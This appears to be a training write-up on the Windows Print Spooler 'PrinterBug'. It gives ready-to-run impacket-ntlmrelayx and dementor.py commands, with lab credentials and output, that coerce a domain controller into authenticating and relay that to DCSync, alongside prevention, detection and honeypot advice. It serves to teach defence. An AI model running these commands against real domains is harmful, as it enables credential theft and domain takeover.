## Description
The Print Spooler is an old service, enabled by default even in the latest Windows Desktop and Server versions. This service became a popular attack vector after the discovery of the "PrinterBug" by Lee Christensen in 2018. The functions `RpcRemoteFindFirstPrinterChangeNotification` and `RpcRemoteFindFirstPrinterChangeNotificationEx` can be exploited to make a remote machine connect to any reachable device, carrying authentication info in the form of a TGT. Microsoft deemed this bug a "by-design" issue and has not issued a fix.

### Impact
If a Domain Controller (DC) with the Print Spooler enabled is compromised, the attacker can:
- **Relay the connection to another DC** and perform DCSync if SMB Signing is disabled.
- **Force the DC to connect to a machine configured for Unconstrained Delegation (UD)**, caching the TGT in the UD server's memory, which tools like Rubeus and Mimikatz can capture.
- **Relay the connection to Active Directory Certificate Services**, allowing threat agents to obtain a certificate for the DC, usable for authenticating as the DC (e.g., DCSync).
- **Configure Resource-Based Kerberos Delegation** for the relayed machine, enabling abuse to authenticate as any Administrator on that machine.

## Attack Methodology
In this scenario, we'll relay the DC connection to another DC and perform DCSync, provided SMB Signing is off on Domain Controllers.

### Step-by-Step Attack Execution

1. **Configure NTLMRelayx** to forward connections to DC2 and attempt DCSync:
    ```bash
    impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
    ```
    Sample Output:
    ```
    Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
    [*] Protocol Client SMTP loaded..
    [*] Protocol Client LDAP loaded..
    ...
    [*] Servers started, waiting for connections
    ```

2. **Trigger the PrinterBug** using Dementor, with NTLMRelayx listening:
    ```bash
    python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
    ```
    Sample Output:
    ```
    [*] connecting to 172.16.18.3
    [*] bound to spoolss
    [*] getting context handle...
    ...
    [-] exception RPRN SessionError: code: 0x6ab - RPC_S_INVALID_NET_ADDR - The network address is invalid.
    ```

3. **Check NTLMRelayx for DCSync Success** - Hashes should appear in the NTLMRelayx terminal.

## Prevention

- **Disable Print Spooler** on all non-printing servers, especially on Domain Controllers.
- **Registry Key Setting**: Use `RegisterSpoolerRemoteRpcEndPoint` to block remote requests:
  - Set to `1` to enable.
  - Set to `2` to disable remote access.

## Detection

Exploiting PrinterBug leaves traces of network connections to the DC, though these are too generic for reliable detection.

- **Log Correlation**: Track all logon attempts from core infrastructure servers by IP address. When NTLMRelayx performs DCSync, no event ID 4662 is generated, but there will be a successful logon event from the IP address of the attacking machine.

## Honeypot Strategy

Using the PrinterBug as a honeypot can alert on suspicious activity by:
- Blocking outbound connections on ports 139 and 445 from servers, which will alert blue teams on compromised reverse connections.
- **Considerations**: Ensure proper log monitoring and be prepared to respond quickly, especially if any new vulnerabilities allowing RCE without reverse connection arise.

---

**Note**: Implement honeypot measures only if the organization is mature enough to act promptly on alerts.
